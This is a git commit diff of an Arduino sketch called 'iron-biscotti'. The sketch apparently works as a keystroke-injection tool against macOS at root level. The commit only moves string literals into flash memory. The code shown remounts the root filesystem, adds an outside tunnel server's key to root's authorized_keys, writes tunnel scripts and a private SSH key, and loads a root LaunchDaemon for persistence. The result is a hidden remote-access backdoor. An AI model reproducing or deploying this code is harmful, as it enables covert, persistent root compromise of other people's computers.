ae1dfe919575181932674ab3468009967b059710
Naookie Sato <necrosato@live.com>
2018-11-17 11:22:06 -0800

    fixed memory issue mostly

--- iron-biscotti/iron-biscotti.ino
+++ iron-biscotti/iron-biscotti.ino
@@ -5,44 +5,44 @@
 char buffer[2048];
 
 void AddTunnelServerKey() {
-  TypeString("echo \"");
+  TypeString(F("echo \""));
   strcpy_P(buffer, ssh_tunnel_server_public_key);
   TypeString(buffer);
-  EnterCommand("\" >> /var/root/.ssh/authorized_keys");
-  EnterCommand("chmod 644 /var/root/.ssh/authorized_keys");
+  EnterCommand(F("\" >> /var/root/.ssh/authorized_keys"));
+  EnterCommand(F("chmod 644 /var/root/.ssh/authorized_keys"));
 }
 
 void IronBiscotti() {
   // Mount the filesystem
-  EnterCommand("mount -uw /");
+  EnterCommand(F("mount -uw /"));
   delay(5);
   // Set the home var so vim doesn't trip
-  EnterCommand("export HOME=/var/root/");
+  EnterCommand(F("export HOME=/var/root/"));
   // Generate host keys
-  EnterCommand("ssh-keygen -A");
+  EnterCommand(F("ssh-keygen -A"));
   // Setup ssh
   strcpy_P(buffer, ssh_setup);
   TypeString(buffer);
   // Setup launch daemon
-  EnterCommand("mkdir -p /var/root/,iron_biscotti/");
+  EnterCommand(F("mkdir -p /var/root/,iron_biscotti/"));
   strcpy_P(buffer, iron_biscotti_sh);
-  WriteToFile("/var/root/,iron_biscotti/iron_biscotti.sh", buffer, "755", "root", "wheel");
+  WriteToFile(F("/var/root/,iron_biscotti/iron_biscotti.sh"), buffer, F("755"), F("root"), F("wheel"));
   delay(5);
   strcpy_P(buffer, tunnel_sh);
-  WriteToFile("/var/root/,iron_biscotti/tunnel.sh", buffer, "755", "root", "wheel");
+  WriteToFile(F("/var/root/,iron_biscotti/tunnel.sh"), buffer, F("755"), F("root"), F("wheel"));
   delay(5);
   strcpy_P(buffer, com_iron_biscotti_plist);
-  WriteToFile("/Library/LaunchDaemons/com.iron_biscotti.plist", buffer, "644", "root", "wheel");
+  WriteToFile(F("/Library/LaunchDaemons/com.iron_biscotti.plist"), buffer, F("644"), F("root"), F("wheel"));
   delay(5);
-  EnterCommand("mkdir -p /var/root/,ssh/");
+  EnterCommand(F("mkdir -p /var/root/,ssh/"));
   strcpy_P(buffer, ssh_private_key);
-  WriteToFile("/var/root/,ssh/id_rsa", buffer, "400", "root", "root");
+  WriteToFile(F("/var/root/,ssh/id_rsa"), buffer, F("400"), F("root"), F("root"));
   delay(5);
   strcpy_P(buffer, ssh_public_key);
-  WriteToFile("/var/root/,ssh/id_rsa.pub", buffer, "644", "root", "root");
+  WriteToFile(F("/var/root/,ssh/id_rsa.pub"), buffer, F("644"), F("root"), F("root"));
   delay(5);
   AddTunnelServerKey();
-  EnterCommand("launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist");
+  EnterCommand(F("launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist"));
 }
 
 void setup() {
